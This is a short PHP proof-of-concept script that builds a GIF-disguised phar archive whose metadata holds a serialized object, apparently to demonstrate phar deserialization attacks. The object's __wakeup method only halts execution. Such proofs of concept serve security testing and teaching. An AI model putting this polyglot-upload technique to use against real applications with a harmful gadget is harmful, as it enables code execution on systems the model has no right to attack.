<?php

class Evil{
  public function __wakeup() : void {
    die("Arbitrary Deserialization");
  }
}


//create new Phar
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("GIF89a\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new Evil();
$phar->setMetadata($object);
$phar->stopBuffering();